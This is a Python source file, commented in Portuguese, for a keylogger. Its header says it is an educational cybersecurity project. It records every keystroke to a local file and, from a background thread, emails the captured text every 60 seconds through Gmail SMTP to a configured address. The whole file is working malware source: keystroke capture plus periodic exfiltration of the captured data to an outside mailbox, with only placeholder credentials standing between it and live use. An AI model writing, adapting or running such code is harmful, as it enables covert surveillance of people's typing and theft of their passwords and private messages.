"""
Keylogger com Envio Automático por E-mail
Captura de teclas e envio periódico dos dados para e-mail
Projeto de Cibersegurança - Ambiente Controlado de Estudo
"""

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import threading
import time
import os

# ============ CONFIGURAÇÕES DE E-MAIL ============
# IMPORTANTE: Usar credenciais de teste/educacionais apenas
EMAIL_ORIGEM = "seu_email@gmail.com"  # Alterar com email de teste
SENHA_EMAIL = "sua_senha_app"  # Usar senha de app do Gmail
EMAIL_DESTINO = "destino@gmail.com"  # Alterar com email de destino

SERVIDOR_SMTP = "smtp.gmail.com"
PORTA_SMTP = 587

# ============ CONFIGURAÇÕES DO KEYLOGGER ============
LOG_FILE = "Keylogger/log_email.txt"
INTERVALO_ENVIO = 60  # Enviar a cada 60 segundos
KEYS_CAPTURED = []

# Teclas a ignorar
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
}


def registrar_tecla(tecla_pressionada):
    """
    Função chamada quando uma tecla é pressionada.
    Registra a tecla no arquivo de log.
    """
    global KEYS_CAPTURED
    
    try:
        if isinstance(tecla_pressionada, keyboard.KeyCode):
            char = tecla_pressionada.char
            if char:
                KEYS_CAPTURED.append(char)
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(char)
        
        elif tecla_pressionada in IGNORAR:
            pass
        
        else:
            if tecla_pressionada == keyboard.Key.space:
                KEYS_CAPTURED.append(" ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" ")
            
            elif tecla_pressionada == keyboard.Key.enter:
                KEYS_CAPTURED.append("\n")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\n")
            
            elif tecla_pressionada == keyboard.Key.tab:
                KEYS_CAPTURED.append("\t")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\t")
            
            elif tecla_pressionada == keyboard.Key.backspace:
                KEYS_CAPTURED.append(" [BACKSPACE] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [BACKSPACE] ")
            
            elif tecla_pressionada == keyboard.Key.esc:
                KEYS_CAPTURED.append(" [ESC] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [ESC] ")
            
            else:
                KEYS_CAPTURED.append(f" [{str(tecla_pressionada)}] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f" [{str(tecla_pressionada)}] ")
    
    except AttributeError:
        pass


def enviar_email(dados_capturados):
    """
    Envia os dados capturados por e-mail.
    
    Args:
        dados_capturados (str): String contendo as teclas capturadas
    """
    try:
        print("[*] Conectando ao servidor SMTP...")
        
        # Cria a conexão SMTP
        server = smtplib.SMTP(SERVIDOR_SMTP, PORTA_SMTP)
        server.starttls()  # Inicia conexão segura
        
        print("[*] Autenticando...")
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        
        # Cria a mensagem
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        msg['Subject'] = f"Dados Capturados - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Corpo da mensagem
        corpo = f"""
        <html>
            <body>
                <h2>Dados Capturados pelo Keylogger</h2>
                <p><strong>Data/Hora:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>Quantidade de Teclas:</strong> {len(dados_capturados)}</p>
                <hr>
                <h3>Conteúdo Capturado:</h3>
                <pre>{dados_capturados[:1000]}</pre>
                <p><em>Nota: Apenas os primeiros 1000 caracteres são exibidos</em></p>
            </body>
        </html>
        """
        
        msg.attach(MIMEText(corpo, 'html'))
        
        # Envia o e-mail
        print("[*] Enviando e-mail...")
        server.send_message(msg)
        server.quit()
        
        print("[+] E-mail enviado com sucesso!")
        return True
    
    except smtplib.SMTPAuthenticationError:
        print("[-] Erro de autenticação. Verifique email e senha.")
        return False
    
    except smtplib.SMTPException as e:
        print(f"[-] Erro ao enviar e-mail: {e}")
        return False
    
    except Exception as e:
        print(f"[-] Erro inesperado: {e}")
        return False


def enviar_dados_periodicamente():
    """
    Envia os dados capturados periodicamente por e-mail.
    """
    while True:
        time.sleep(INTERVALO_ENVIO)
        
        if len(KEYS_CAPTURED) > 0:
            dados = ''.join(KEYS_CAPTURED)
            print(f"\n[*] Enviando {len(KEYS_CAPTURED)} teclas capturadas...")
            
            # Envia por e-mail
            if enviar_email(dados):
                KEYS_CAPTURED.clear()
            else:
                print("[-] Falha ao enviar. Mantendo dados para próxima tentativa.")


def iniciar_keylogger_com_email():
    """
    Inicia o keylogger com envio automático por e-mail.
    """
    print("[*] Keylogger com Envio por E-mail iniciado...")
    print(f"[*] Registrando em: {LOG_FILE}")
    print(f"[*] Enviando dados a cada {INTERVALO_ENVIO} segundos")
    print(f"[*] E-mail de origem: {EMAIL_ORIGEM}")
    print(f"[*] E-mail de destino: {EMAIL_DESTINO}")
    print("[*] Pressione Ctrl+C para parar\n")
    
    # Thread para envio periódico
    thread_envio = threading.Thread(target=enviar_dados_periodicamente, daemon=True)
    thread_envio.start()
    
    # Inicia o listener de teclado
    with keyboard.Listener(on_press=registrar_tecla) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[!] Keylogger parado pelo usuário")
            
            # Envia os dados restantes
            if len(KEYS_CAPTURED) > 0:
                print("[*] Enviando dados restantes...")
                dados = ''.join(KEYS_CAPTURED)
                enviar_email(dados)
            
            print("[*] Finalizando...")


if __name__ == "__main__":
    # Verifica se as credenciais foram configuradas
    if EMAIL_ORIGEM == "seu_email@gmail.com" or SENHA_EMAIL == "sua_senha_app":
        print("[!] AVISO: Credenciais de e-mail não configuradas!")
        print("[!] Edite o arquivo e configure EMAIL_ORIGEM e SENHA_EMAIL")
        print("[!] Para Gmail, use uma senha de app: https://support.google.com/accounts/answer/185833")
        print()
        resposta = input("Deseja continuar apenas registrando em arquivo? (s/n): ")
        if resposta.lower() != 's':
            exit()
    
    # Cria o arquivo de log
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"=== KEYLOGGER COM EMAIL - Iniciado em {datetime.now()} ===\n")
    
    # Inicia o keylogger
    iniciar_keylogger_com_email()

